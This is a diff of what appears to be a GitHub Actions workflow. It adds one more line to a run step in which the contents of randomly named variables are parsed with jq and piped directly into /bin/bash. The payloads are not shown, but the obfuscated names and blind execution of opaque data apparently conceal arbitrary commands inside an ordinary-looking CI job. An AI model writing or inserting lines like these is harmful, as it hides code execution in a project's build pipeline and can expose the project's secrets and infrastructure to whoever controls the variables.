@@ -23,6 +23,7 @@ jobs:
           echo $adp044 | jq -r .qspyn3448 | /bin/bash
           echo $aseaf6 | jq -r .q4 | /bin/bash
           echo $mnsf7 | jq -r .fzisa02769 | /bin/bash
+          echo $pope2335 | jq -r .sw6 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
